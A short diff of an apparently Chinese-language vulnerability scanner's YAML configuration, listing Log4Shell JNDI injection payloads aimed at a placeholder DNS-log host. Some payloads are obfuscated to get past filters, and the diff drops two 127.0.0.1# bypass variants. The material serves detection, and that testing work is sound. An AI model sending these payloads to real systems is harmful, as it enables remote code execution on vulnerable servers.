@@ -244,8 +244,6 @@ application:
         - "${jndi:rmi://dnslog-url/t}"
         - "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://dnslog-url/t}"
         - "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://dnslog-url/t}"
-        - "${jndi:ldap://127.0.0.1#.dnslog-url/a}"
-        - "${jndi:rmi://127.0.0.1#.dnslog-url/a}"
 
 # dnsLog模块
 dnsLogModule:
